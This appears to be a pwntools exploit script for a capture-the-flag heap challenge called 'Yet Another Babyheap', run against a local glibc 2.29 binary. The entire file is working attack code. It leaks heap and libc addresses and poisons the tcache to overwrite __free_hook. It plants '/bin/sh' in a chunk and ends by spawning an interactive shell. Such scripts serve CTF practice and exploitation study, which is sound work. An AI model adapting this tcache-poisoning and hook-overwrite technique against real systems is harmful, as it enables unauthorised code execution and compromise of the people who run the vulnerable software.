from pwn import *
from heaputils import get_PIE

def get_prompt():
	return p.recvuntil("------------------------")

def malloc(size,content):
	p.sendline("M")
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.send(content)
	get_prompt()

def show(idx):
	p.sendline("S")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	data = p.recvuntil("-----Yet Another Babyheap!-----").split("\n")[1].strip("> ").strip()
	get_prompt()
	return data

def free(idx):
	p.sendline("F")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	get_prompt()

def debug():
	array = PIE + 0x4060
	log.info("array: 0x%x"%array)
	gdb.attach(p)

if __name__=="__main__":
	libc = ELF("./libc.so.6")
	p = process(["./ld-2.29.so","./babyheap"],env={"LD_PRELOAD":"./libc.so.6"})
	PIE = get_PIE(p,8)

	for i in range(9):
		malloc(0x78,"\n")


	for i in range(7,-1,-1):
		free(i)

	malloc(0x78,"\n") #0
	HEAP = u64(show(0).ljust(8,"\x00"))
	log.info("HEAP: 0x%x"%HEAP)

	malloc(0xF8,"\n") #1
	free(0)

	malloc(0xF8,"A"*0xF8+chr(0x81)+"\n") 
	free(1) # now added to 0x180 tcache bin

	malloc(0xF8,"\n") #1
	free(1)

	# write byte by byte, get tcache alloc'ed
	# 0x10 = 8 for header, 8 for tcache fd
	tcache = HEAP + 0x7f33dc4750c0 - 0x7f33dc475460
	payload = p64(0x100)+p64(tcache)
	payload = payload[::-1]
	for i in range(0x10,1,-1):
		ch = payload[-i]
		if ch == "\x00" or ch == "\n":
			malloc(i+0xF7,"A"*(i+0xF7)+payload[-i]) #1
			free(1)
		else:
			malloc(i+0xF7,"A"*(i+0xF7)+payload[-i]+"\n") #1
			free(1)

	
	malloc(0x10,"A"*0x10+"\n")
	addr = HEAP + 0x7f9b01cb8268 - 0x7f9b01cb8460
	malloc(0x10,p64(addr).strip("\x00")+"\n")
	malloc(0x10,"\n")

	LIBC = u64(show(3).ljust(8,"\x00")) + 0x7f795e412000 - 0x7f795e5f6ca0
	log.info("LIBC: 0x%x"%LIBC)
	
	# don't free chunk3 from now on
	malloc(0x10,"\n") #don't touch top
	malloc(0x178,"\n") # from tcache
	malloc(0x178,"\n") # from top (5)
	malloc(0x178,"\n") # prevent consolidate

	free(5)

	free_hook = LIBC + libc.symbols['__free_hook']
	system = LIBC + libc.symbols['system']
	entry = LIBC + 0x026C80 

	free(6)
	malloc(0x20,"A"*0x10+p64(free_hook).strip("\x00")+"\n")
	#debug()
	# next next malloc (0x178 will allocate free_hook)
	malloc(0x178,"/bin/sh;\x00")
	free(0) # obtain slot
	malloc(0x178,p64(entry).strip("\x00")+"\n")
	
	p.interactive()
